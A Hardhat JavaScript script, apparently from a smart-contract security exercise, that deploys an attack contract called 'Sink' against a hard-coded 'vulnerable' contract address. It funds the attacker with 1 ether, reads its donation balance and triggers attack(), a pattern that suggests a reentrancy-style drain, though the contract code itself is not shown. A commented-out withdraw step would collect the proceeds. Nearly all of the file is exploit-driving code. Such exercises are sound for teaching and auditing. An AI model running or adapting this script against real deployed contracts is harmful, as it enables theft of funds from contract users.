const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const [deployer] = await ethers.getSigners();
    const vulnerableContract = "0xF81A1dd745AC795d1E253ED7bFE4b774631153b1";
    
    console.log("Account balance:", (await deployer.getBalance()).toString());

    const AttackContract = await ethers.getContractFactory("Sink");
    const attack = await AttackContract.deploy(vulnerableContract);

    await attack.deployed();
    console.log("Attack Contract address:", attack.address);

    saveFrontendFiles(attack);

    // make a deposit to contract address so it can withdraw later
    await deployer.sendTransaction({
      to: attack.address,
      value: ethers.utils.parseEther('1')
      // gasLimit: BigNumber('100000000')
    });

    let balance = await attack.myDonation(attack.address);
    console.log('donation: '+ balance.toString());

    // if (balance > 0) {
    await attack.connect(deployer).attack();
    // }

    // let contract_balance = await attack.myBalance();
    // console.log('attack result: '+ contract_balance.toString());

    // if (contract_balance > 0) {
    //   await attack.connect(deployer).withdraw();
    //   console.log('withdraw successful!')
    // }
    // else {
    //   console.log('nothing to withdraw!')
    // }

}

function saveFrontendFiles(contract) {
    const fs = require("fs");
    const contractsDir = __dirname + "/../src/abis";

    if (!fs.existsSync(contractsDir)) {
        fs.mkdirSync(contractsDir);
    }

    fs.writeFileSync(
        contractsDir + "/contract-address.json",
        JSON.stringify({ AttackContract: contract.address }, undefined, 2)
    );

    const ContractArtifact = artifacts.readArtifactSync("Sink");

    fs.writeFileSync(
        contractsDir + "/AttackContract.json",
        JSON.stringify(ContractArtifact, null, 2)
    );
}


main()
    .then(() => process.exit(0))
    .catch(error => {
        console.log(error);
        process.exit(1);
    });